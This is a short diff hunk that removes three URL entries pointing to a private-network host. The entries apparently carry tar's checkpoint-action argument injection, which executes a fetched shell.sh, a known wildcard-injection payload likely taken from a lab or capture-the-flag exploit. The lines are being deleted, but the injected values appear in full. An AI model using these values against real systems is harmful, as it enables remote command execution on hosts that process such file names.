@@ -1,3 +1,0 @@
-http://192.168.168.20:8000/--checkpoint=1
-http://192.168.168.20:8000/--checkpoint-action=exec=sh shell.sh
-http://192.168.168.20:8000/shell.sh
